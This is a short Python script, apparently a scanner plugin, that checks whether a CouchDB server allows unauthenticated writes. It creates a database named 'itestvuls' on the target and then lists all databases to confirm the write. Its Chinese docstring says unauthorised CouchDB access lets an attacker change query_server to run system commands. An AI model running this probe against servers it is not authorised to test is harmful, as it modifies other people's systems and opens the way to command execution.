#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: CouchDB 未授权漏洞
referer: https://www.cnblogs.com/xiaozi/p/8279983.html
author: Lucifer
description: CouchDB允许通过自身提供的Restful API接口动态修改配置属性。
            结合以上两点，我们可以通过一个未授权访问的CouchDB，通过修改其query_server配置，来执行系统命令。
'''
import sys
import requests
import warnings

from urllib.parse import urlparse
def run(url):
        result = ['CouchDB 未授权漏洞', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/itestvuls"
        vulnurl = url + payload
        try:
            req = requests.put(vulnurl)
            vulnurl = url + "/_all_dbs"
            req2 = requests.get(vulnurl, headers=headers, timeout=6, verify=False)
            if r"itestvuls" in req2.text:
                result[2] = '存在'
                result[1]=vulnurl+"\t创建数据库itestvuls"
            else:
                result[2] = '不存在'

        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
